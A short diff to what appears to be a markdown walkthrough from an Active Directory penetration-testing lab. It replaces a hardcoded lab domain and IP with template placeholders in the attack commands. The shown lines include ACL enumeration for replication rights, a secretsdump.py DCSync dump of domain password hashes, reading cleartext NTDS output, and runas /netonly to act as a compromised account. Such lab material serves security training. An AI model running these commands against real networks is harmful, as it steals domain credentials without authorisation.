@@ -22,7 +22,7 @@ Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType 
 ## 3. `shellsession` _(output omitted)_
 
 ```bash
-secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
+secretsdump.py -outputfile inlanefreight_hashes -just-dc {{DOMAIN_NB}}/adunn@{{DC_IP}} 
 ```
 
 ## 4. `shellsession` _(output omitted)_
@@ -52,7 +52,7 @@ cat inlanefreight_hashes.ntds.cleartext
 ## 8. `cmd` _(output omitted)_
 
 ```cmd
-runas /netonly /user:INLANEFREIGHT\adunn powershell
+runas /netonly /user:{{DOMAIN_NB}}\adunn powershell
 ```
 
 ## 9. `powershell` _(output omitted)_
